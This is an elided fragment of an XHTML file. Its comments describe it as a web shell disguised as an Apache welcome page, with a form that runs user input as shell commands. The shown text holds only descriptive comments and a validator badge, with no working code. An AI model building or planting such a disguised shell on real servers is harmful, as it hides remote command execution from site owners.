...
<html xmlns="http://www.w3.org/1999/xhtml">
    ...
    <!-- This tool disguises as an Apache welcome page but includes a form that sends the text entered to this script and executes the user's input as a shell command. -->
  <!--
...
|       `-- *.conf
    ...
    <p>
      <a href="http://validator.w3.org/check?uri=referer"><img src="http://www.w3.org/Icons/valid-xhtml10" alt="Valid XHTML 1.0 Transitional" height="31" width="88" /></a>
        ...
        <!-- Form submits to the same page and gets its filename -->
